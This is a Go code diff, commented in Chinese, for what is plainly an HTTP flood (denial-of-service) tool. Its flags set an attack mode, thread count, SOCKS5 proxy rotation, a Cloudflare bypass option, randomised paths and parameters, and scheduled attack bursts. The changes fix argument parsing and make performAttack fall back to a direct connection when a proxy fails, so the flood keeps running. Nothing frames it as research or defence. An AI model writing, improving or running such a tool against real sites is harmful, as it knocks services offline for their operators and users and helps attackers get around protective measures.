@@ -109,7 +109,7 @@ func parseArgs() *Config {
 		ScheduleDuration: 20, // 默认20分钟执行时长
 	}
 	
-	// 解析命令行参数
+	// 解析命令行参数 - 按重要性排序
 	flag.StringVar(&config.TargetURL, "url", config.TargetURL, "目标URL")
 	flag.StringVar(&config.Mode, "mode", config.Mode, "攻击模式 (get/post/head)")
 	flag.IntVar(&config.Threads, "threads", config.Threads, "线程数")
@@ -118,23 +118,23 @@ func parseArgs() *Config {
 	flag.IntVar(&config.Timeout, "timeout", config.Timeout, "超时时间(秒)")
 	flag.StringVar(&config.ProxyFile, "proxy-file", config.ProxyFile, "SOCKS5代理文件")
 	flag.BoolVar(&config.CFBypass, "cf-bypass", config.CFBypass, "启用CF绕过")
-	flag.BoolVar(&config.RandomPath, "random-path", config.RandomPath, "随机路径")
 	flag.BoolVar(&config.RandomParams, "random-params", config.RandomParams, "随机参数")
 	flag.BoolVar(&config.Schedule, "schedule", config.Schedule, "启用定时执行")
 	flag.IntVar(&config.ScheduleInterval, "schedule-interval", config.ScheduleInterval, "定时执行间隔（分钟）")
 	flag.IntVar(&config.ScheduleDuration, "schedule-duration", config.ScheduleDuration, "每次执行时长（分钟）")
+	flag.BoolVar(&config.RandomPath, "random-path", config.RandomPath, "随机路径")
 	flag.Parse()
 	
 	// 检查URL是否为空或无效
-	if config.TargetURL == "" || config.TargetURL == "-random-path" {
+	if config.TargetURL == "" || config.TargetURL == "-random-path" || config.TargetURL == "-random-params" {
 		fmt.Printf("❌ 错误: 目标URL为空或无效: %s\n", config.TargetURL)
 		fmt.Printf("请检查任务配置中的URL字段\n")
 		os.Exit(1)
 	}
 	
-	// 如果还有位置参数，使用它们
+	// 如果还有位置参数，使用它们（但不要覆盖已设置的flag值）
 	args := flag.Args()
-	if len(args) >= 4 {
+	if len(args) >= 4 && config.TargetURL == "" {
 		config.Mode = args[0]
 		config.TargetURL = args[1]
 		if t, err := strconv.Atoi(args[2]); err == nil {
@@ -288,12 +288,15 @@ func performAttack(config *Config) bool {
 	
 	// 选择代理
 	var client *http.Client
+	var useProxy bool
 	if len(proxies) > 0 {
 		proxy := proxies[rand.Intn(len(proxies))]
 		client = createSOCKS5Client(proxy, strconv.Itoa(config.Timeout))
+		useProxy = true
 	} else {
 		// 代理为空，使用直连
 		client = createDirectClient(config.Timeout)
+		useProxy = false
 	}
 	
 	// 构建最终URL
@@ -322,8 +325,18 @@ func performAttack(config *Config) bool {
 	// 发送请求
 	resp, err := client.Do(req)
 	if err != nil {
-		// 记录错误类型
-		if strings.Contains(err.Error(), "timeout") {
+		// 如果使用代理失败，尝试直连
+		if useProxy && (strings.Contains(err.Error(), "no acceptable authentication methods") || 
+			strings.Contains(err.Error(), "connection refused") ||
+			strings.Contains(err.Error(), "timeout")) {
+			// 回退到直连
+			client = createDirectClient(config.Timeout)
+			resp, err = client.Do(req)
+		}
+		
+		if err != nil {
+			// 记录错误类型
+			if strings.Contains(err.Error(), "timeout") {
 			fmt.Printf("⏰ 请求超时: %v\n", err)
 		} else if strings.Contains(err.Error(), "connection refused") {
 			fmt.Printf("🚫 连接被拒绝: %v\n", err)
